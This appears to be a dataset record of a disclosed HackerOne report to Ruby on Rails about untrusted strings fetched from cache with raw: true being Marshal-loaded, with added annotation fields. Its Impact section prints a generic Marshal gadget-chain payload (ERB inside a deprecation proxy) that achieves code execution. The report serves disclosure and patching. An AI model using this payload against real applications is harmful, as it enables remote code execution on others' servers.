{
  "reported_to": "Ruby on Rails",
  "reported_by": "dylan-ts ",
  "title": "Untrusted strings that are cache fetched with raw option are automatically marshal loaded",
  "content": "\nThis vulnerability effects application code that caches a string from an untrusted source using the raw: true option. For example, vulnerable application code might looks something like the following\nCode 152 Bytes\n1body = Rails.cache.fetch(key, raw: true, expires_in: ttl) do\n2  res = Net::HTTP.get_response(remote_uri)\n3  res.value # raise on HTTP error\n4  res.body\n5end\nwhere res.body represents the untrusted string in the example above. The below script shows that an untrusted string in the Marshal format will be deserialized when read using raw: true.\nCode 276 Bytes\n1require 'rails/all'\n2\n3untrusted_string = Marshal.dump(:sym)\n4\n5cache = ActiveSupport::Cache::MemCacheStore.new('localhost')\n6cache.delete(\"demo\")\n7data = cache.fetch(\"demo\", raw: true) { untrusted_string }\n8p data # \"\\x04\\b:\\bsym\"\n9data = cache.fetch(\"demo\", raw: true)\n10p data # :sym\nThis vulnerability appears to have been around for a long time, so would affect all currently supported versions of rails. I've tested with the earliest and latest supported rails version, 4.2.10 and 5.2.1 and both are affected.\nThe vulnerability affects both MemCacheStore and RedisCacheStore cache backends that are a part of rails, but cache stores developed outside of rails could also be vulnerable. For instance, the memcached_store has the same vulnerability as a result of replicating the behaviour of MemCacheStore.\nI've attached patches to fix MemCacheStore and RedisCacheStore on master. I believe the MemCacheStore patch can be backported, since Dalli uses memcached's flags to tag keys that need marshal loading (since Dalli version 0.11.0) so can avoid unmarshalling raw strings. However, backporting RedisCacheStore could cause backwards compatibility problems with application code that writes and reads a cache key with a different raw option value, so I've included a patch to deprecate that usage in rails 5.2.\nImpact\nAs has been demonstrated in the past, Marshal.load of an untrusted string can lead to remote code execution when done in rails without any reliance on application code.\nThe following script demonstrates that this is still the case and shows that a generic exploit payload can be used.\nCode 386 Bytes\n1require 'erb'\n2require 'rails/all'\n3\n4remote_code = <<-RUBY\n5puts 'HACKED'\n6RUBY\n7\n8erb = ERB.allocate\n9erb.instance_variable_set(:@src, remote_code)\n10erb.instance_variable_set(:@lineno, 0)\n11deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)\n12exploit_data = Marshal.dump(deprecation)\n13\n14obj = Marshal.load(exploit_data)\n15obj.is_a?(ActiveSupport::Cache::Entry)\nSo a generic exploit payload could be provided to applications to try to find if the application stores and fetches raw strings from the cache.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {},
  "disclosed_date": 1590547080,
  "report_url": "https://hackerone.com/reports/413388",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Cache an untrusted string using Rails.cache.fetch with raw: true option"
    ],
    [
      2,
      "Retrieve the cached string using the same raw: true option, causing automatic Marshal.load"
    ]
  ],
  "vuln_description": "The vulnerability allows remote code execution through automatic deserialization of untrusted strings cached with the raw: true option in Rails. When a maliciously crafted string (Marshal format) is stored and later retrieved from cache with raw: true, it gets automatically deserialized via Marshal.load, which can lead to arbitrary code execution.",
  "reason": "While the vulnerability involves understanding Rails caching mechanisms and Marshal serialization, the attack path is relatively straightforward once these components are known. The interaction between raw caching and automatic deserialization is documented behavior, though the security implications might not be immediately obvious.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}